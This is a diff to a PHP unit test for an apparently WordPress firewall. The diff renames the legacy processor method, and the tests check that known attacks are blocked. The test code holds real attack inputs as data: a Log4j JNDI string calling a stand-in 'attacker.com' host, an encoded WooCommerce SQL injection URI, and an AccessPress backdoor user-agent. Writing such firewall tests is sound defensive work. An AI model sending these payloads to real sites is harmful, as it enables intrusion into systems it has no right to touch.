@@ -34,6 +34,7 @@ final class FirewallLegacyTest extends TestCase
     private function setUpFirewallProcessor(array $rules)
     {
         $this->processor = new Processor(
+            [],
             $rules,
             [],
             [],
@@ -65,7 +66,7 @@ final class FirewallLegacyTest extends TestCase
     public function testAllRules()
     {
         $this->setUpFirewallProcessor($this->rules);
-        $this->assertTrue($this->processor->legacyProcessor());
+        $this->assertTrue($this->processor->launchLegacy());
     }
 
     /**
@@ -88,7 +89,7 @@ final class FirewallLegacyTest extends TestCase
             $this->alterPayload(['GET' => [
                 'q' => $payload
             ]]);
-            $this->assertFalse($this->processor->legacyProcessor(false), 'Testing XSS failed with payload: ' . $payload);
+            $this->assertFalse($this->processor->launchLegacy(false), 'Testing XSS failed with payload: ' . $payload);
         }
     }
 
@@ -112,7 +113,7 @@ final class FirewallLegacyTest extends TestCase
             $this->alterPayload(['GET' => [
                 'q' => $payload
             ]]);
-            $this->assertFalse($this->processor->legacyProcessor(false), 'Testing SQLI failed with payload: ' . $payload);
+            $this->assertFalse($this->processor->launchLegacy(false), 'Testing SQLI failed with payload: ' . $payload);
         }
     }
 
@@ -136,7 +137,7 @@ final class FirewallLegacyTest extends TestCase
             $this->alterPayload(['GET' => [
                 'q' => $payload
             ]]);
-            $this->assertFalse($this->processor->legacyProcessor(false), 'Testing LFI failed with payload: ' . $payload);
+            $this->assertFalse($this->processor->launchLegacy(false), 'Testing LFI failed with payload: ' . $payload);
         }
     }
 
@@ -153,12 +154,12 @@ final class FirewallLegacyTest extends TestCase
         $this->alterPayload(['GET' => [
             'action' => 'fs_retry_connectivity_test_'
         ]]);
-        $this->assertFalse($this->processor->legacyProcessor(false));
+        $this->assertFalse($this->processor->launchLegacy(false));
 
         // Block AccessPress backdoor through user-agent.
         $_SERVER['HTTP_USER_AGENT'] = 'wp_is_mobile';
         $this->alterPayload();
-        $this->assertFalse($this->processor->legacyProcessor(false));
+        $this->assertFalse($this->processor->launchLegacy(false));
         $_SERVER['HTTP_USER_AGENT'] = '';
         
         // Block Apache Log4j vulnerability.
@@ -167,12 +168,12 @@ final class FirewallLegacyTest extends TestCase
                 'q' => '${jndi:ldap://attacker.com/reference}'
             ]
         ]);
-        $this->assertFalse($this->processor->legacyProcessor(false));
+        $this->assertFalse($this->processor->launchLegacy(false));
 
         // Block WooCommerce SQL injection.
         $this->alterPayload();
         $_SERVER['REQUEST_URI'] = '/wp-json/wc/store/products/collection-data?calculate_attribute_counts\[\]\[query_type\]=and&calculate_attribute_counts\[\]\[taxonomy\]=poc%252522%252529%252520OR%252520SLEEP%2525281%252529%252523';
-        $this->assertFalse($this->processor->legacyProcessor(false));
+        $this->assertFalse($this->processor->launchLegacy(false));
         $_SERVER['REQUEST_URI'] = '';
     }
 }
